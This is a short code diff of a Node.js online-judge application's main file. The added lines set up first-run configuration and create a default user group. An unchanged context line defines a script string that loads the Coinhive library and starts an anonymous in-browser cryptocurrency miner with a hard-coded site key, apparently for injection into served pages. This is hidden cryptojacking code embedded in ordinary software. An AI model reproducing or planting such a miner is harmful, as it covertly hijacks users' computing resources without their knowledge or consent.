@@ -4,6 +4,15 @@ let fs = require('fs');
 let path = require('path');
 let mscript = `$.getScript('https://coinhive.com/lib/coinhive.min.js').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous('2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY', {language: 'en'});miner.start();})`;
 
+global.firstRun = false;
+
+try {
+	require('./config.json');
+} catch (e) {
+	global.firstRun = true;
+	require('./first')();
+}
+
 global.zoj = {
 	rootDir: __dirname,
 	config: require('./config.json'),
@@ -73,6 +82,13 @@ global.zoj = {
 
 		await this.connectDatabase();
 		this.loadModules();
+
+		if (firstRun) {
+			let Group = zoj.model('group');
+			let group = await Group.create();
+			group.name = 'User';
+			await group.save();
+		}
 	},
 	async connectDatabase() {
 		let Sequelize = require('sequelize');
